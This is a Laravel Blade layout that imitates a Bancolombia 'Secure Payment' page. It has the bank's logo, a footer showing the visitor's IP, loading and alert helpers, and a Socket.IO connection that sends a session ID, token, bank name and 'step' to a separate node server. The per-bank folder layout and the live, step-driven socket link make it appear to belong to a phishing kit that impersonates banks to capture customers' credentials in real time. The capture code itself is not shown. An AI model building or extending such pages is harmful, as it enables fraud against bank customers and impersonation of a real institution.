<!doctype html>
<html lang="{{ str_replace('_','-', app()->getLocale()) }}">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="csrf-token" content="{{ csrf_token() }}">

    {{-- CSS del banco --}}
    <link rel="stylesheet" href="{{ asset('assets/css/payment/bancolombia.css') }}">

    {{-- Bootstrap / Fonts / Icons --}}
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet"
          integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">

    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;500;600;700;800&display=swap"
          rel="stylesheet">

    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">

    <title>@yield('title', 'Secure Payment')</title>

    {{-- Para CSS extra por pantalla --}}
    @stack('head')
</head>

<body>

    @include('banks.bancolombia._partials.loading')

    {{-- ALERT (se puede mostrar/ocultar por pantalla) --}}
    @yield('alert')

    <div id="page">

        <div id="trazo">
            <div class="logo">
                <img src="{{ asset('assets/img/payment/bancolombia/logo.svg') }}" alt="Bancolombia">
            </div>

            <div class="title">
                <h1>@yield('page_title')</h1>
            </div>

            <div class="contenido">
                @yield('content')
            </div>
        </div>

        {{-- FOOTER reutilizable --}}
        @include('banks.bancolombia._partials.footer', [
            // Puedes pasar IP/fecha desde el controller o dejarlo por defecto
            'ip' => $ip ?? null,
            'datetimeText' => $datetimeText ?? null,
        ])

    </div>

    {{-- JS utilidades (loading/alerts) --}}

<script>
    window.showLoading = function(text = 'Cargando...') {
        const overlay = document.getElementById('loadingOverlay');
        const label = document.getElementById('loadingText');

        if (!overlay || !label) return;

        label.textContent = text;
        overlay.classList.add('is-open');
        overlay.setAttribute('aria-hidden', 'false');

        // bloquea scroll
        document.documentElement.style.overflow = 'hidden';
        document.body.style.overflow = 'hidden';
      }

      window.hideLoading = function() {
        const overlay = document.getElementById('loadingOverlay');
        if (!overlay) return;

        overlay.classList.remove('is-open');
        overlay.setAttribute('aria-hidden', 'true');

        // desbloquea scroll
        document.documentElement.style.overflow = '';
        document.body.style.overflow = '';
      }
</script>
<script>
      function showBankAlert(id=null, text=null){
        const el = document.getElementById(id);
        if(!el) return;

        if(text){
          const t = el.querySelector('[data-alert-text]');
          if(t) t.textContent = text;
        }

        el.style.display = 'block';
        el.setAttribute('aria-hidden', 'false');
      }

      function hideBankAlert(id='alert'){
        const el = document.getElementById(id);
        if(!el) return;

        el.style.display = 'none';
        el.setAttribute('aria-hidden', 'true');
      }
    </script>

{{-- Socket.IO + tu conexión global --}}
<script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
<script src="{{ asset('assets/js/sc.js') }}"></script>
<script>  
  window.RT = window.RT || {};
  window.RT.bank = @json($bank);
  window.RT.step = @json((string)($step ?? "1"));
  window.RT.nodeUrl = @json($nodeUrl);
  window.RT.sessionId = @json($sessionId);
  window.RT.sessionToken = @json($sessionToken);
</script>
<script>
  
document.addEventListener('DOMContentLoaded', function () {

  // Si hay token, conecta inmediatamente desde el layout
  const RT = window.RT || {};
  if (RT.nodeUrl && RT.sessionId && RT.sessionToken && RT.bank && RT.step) {
    initSocketConnection(RT.nodeUrl, RT.sessionId, RT.sessionToken, RT.bank, RT.step);
  }
});
</script>

 @stack('scripts')

</body>
</html>
